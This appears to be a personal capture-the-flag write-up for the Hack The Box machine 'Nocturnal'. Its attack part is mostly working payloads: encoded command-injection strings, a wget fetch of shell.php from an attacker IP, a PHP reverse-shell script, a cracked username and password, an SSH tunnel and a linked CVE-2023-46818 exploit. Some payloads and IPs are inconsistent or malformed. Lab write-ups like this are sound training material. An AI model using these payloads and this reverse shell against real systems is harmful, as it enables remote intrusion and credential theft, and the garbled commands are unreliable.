[[HTB Labs]]
![[Pasted image 20250813015205.png]]

```
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=htb.xls' -w ~/Downloads/names.txt -H 'Cookie: PHPSESSID=2rsvo9jrv63lotfd6uoc81jpk5' -fs 2985 -mc 200 
```

![[Pasted image 20250808154308.png]]

Use **%0a **to change the line**, replace the space **with** %09**, you can command execution
```
%0Abash%09-c%09"whoami"%0A
```

```
%0Abash%09-c%09"wget%0910.10.14.37:8000/shell.php"%0A
```
- **`%0A`** → newline character (line break, often used in injections).
- **`bash`** → runs the Bash shell.
- **`%09`** → tab character (acts as a separator, similar to a space).
- **`-c`** → tells Bash to execute the following command as a string.
- **`wget`** → command-line utility to download files from the internet.
- **`10.10.16.3:8000/shell.php`** → the URL of the file to download (in this case, `shell.php` from the host `10.10.16.3` on port `8000`).
- **Final `%0A`** → another newline.
![[Pasted image 20250808163130.png]]

```
%0Abash%09-c%09php%shell.php"%0A
```

shell.php
```
<?php
$ip = '10.10.14.37'; 
$port = 4444;        
$sock = fsockopen($ip, $port);
if ($sock) {
    exec('/bin/sh -i <&3 >&3 2>&3');
}
?>
```

![[Pasted image 20250808171159.png]]

`sqlite3 noctournal_database.db`
![[Pasted image 20250808171213.png]]

![[Pasted image 20250808171726.png]]

i tried user:tobias and passwd: slowmotionapocalypse
![[Pasted image 20250808171840.png]]

a4902d780d48e97c6f00157656937ce7

![[Pasted image 20250808172620.png]]

now to get that port 8080 do
```
ssh tobias@10.10.14.37 -L 9090:127.0.0.1:8080
```

After logging in now we need to access there does it host
typing the command "cd /var/www" to navigate there also we can open that port 8080 to our browser
![[Pasted image 20250808174518.png]]
now lets open that in our browser
![[Pasted image 20250808174254.png]]trying to do tobias and the opassword nothing words
but upon inspecting where is a version.
![[Pasted image 20250808174659.png]]

https://github.com/ajdumanhug/CVE-2023-46818/blob/main/CVE-2023-46818.py
![[Pasted image 20250808175126.png]]![[Pasted image 20250808175138.png]]

